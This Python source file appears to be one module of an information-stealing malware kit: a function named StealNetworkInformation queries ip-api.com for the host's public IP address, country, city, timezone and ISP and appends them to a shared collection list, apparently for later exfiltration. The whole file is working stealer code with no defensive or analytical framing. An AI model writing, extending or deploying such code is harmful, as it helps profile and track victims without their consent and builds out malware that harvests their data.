from main import ListFonction, error_handler
import aiohttp # type: ignore

async def StealNetworkInformation(self) -> None:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://ip-api.com/json") as response:
                data = await response.json()
                ip = data["query"]
                country = data["country"]
                city = data["city"]
                timezone = data["timezone"]
                isp_info = data["isp"] + f" {data['org']} {data['as']}"
                ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
    except Exception as e:
        error_handler(f"network error - {str(e)}")